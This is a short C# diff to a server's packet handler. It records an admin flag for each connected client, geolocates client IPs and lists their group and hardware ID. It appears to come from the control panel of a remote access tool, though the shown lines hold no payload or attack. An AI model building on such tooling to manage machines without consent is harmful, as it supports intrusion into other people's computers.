@@ -36,7 +36,15 @@ namespace Server.Handle_Packet
                     }
                     catch { }
                 }
-
+                if (unpack_msgpack.ForcePathObject("User").AsString.ToLower() =="user") 
+                {
+                    client.Admin = false;
+                } 
+                else
+                {
+                    client.Admin = true;
+                }
+                
                 client.LV = new ListViewItem
                 {
                     Tag = client,
@@ -47,15 +55,10 @@ namespace Server.Handle_Packet
                 {
                     ipinf = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                     client.LV.SubItems.Add(ipinf[1]);
-                    try
-                    {
-                        client.LV.ImageKey = ipinf[2] + ".png";
-                    }
-                    catch { }
                 }
                 catch
                 {
-                    client.LV.SubItems.Add("??");
+                    client.LV.SubItems.Add("Unknown");
                 }
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
